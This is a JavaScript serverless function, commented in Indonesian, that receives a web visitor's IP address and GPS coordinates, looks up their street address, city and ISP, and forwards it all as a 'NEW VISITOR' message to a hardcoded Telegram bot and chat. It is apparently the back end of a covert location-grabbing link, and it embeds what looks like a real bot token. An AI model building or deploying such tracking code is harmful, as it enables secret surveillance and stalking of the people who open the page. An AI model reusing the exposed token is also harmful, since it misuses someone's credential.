module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { ip, lat, lon, accuracy } = req.body;
    
    // GANTI DENGAN TOKEN DAN CHAT ID LO YANG BENAR
    const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
    const chatId = '8564704937';  // Chat ID dari getUpdates
    
    let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || '-'}\n`;
    
    if (lat && lon) {
        msg += `📍 GPS: ${lat}, ${lon}\n📏 Akurasi: ${accuracy || '?'} meter\n`;
        try {
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const geo = await geoRes.json();
            msg += `🏠 Alamat: ${geo.display_name || '-'}\n`;
        } catch(e) {
            console.error('Reverse geo error:', e);
        }
    } else if (ip) {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
            const geo = await geoRes.json();
            if (geo.status === 'success') {
                msg += `📍 Lokasi: ${geo.city}, ${geo.regionName}, ${geo.country}\n📡 ISP: ${geo.isp}\n🗺️ Koordinat: ${geo.lat}, ${geo.lon}\n`;
            }
        } catch(e) {}
    }
    
    msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
    
    // Kirim ke Telegram
    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
        const tgData = await tgRes.json();
        console.log('Telegram response:', tgData);
    } catch (err) {
        console.error('Telegram error:', err);
    }
    
    res.json({ status: 'ok', received: { ip, lat, lon, accuracy } });
};
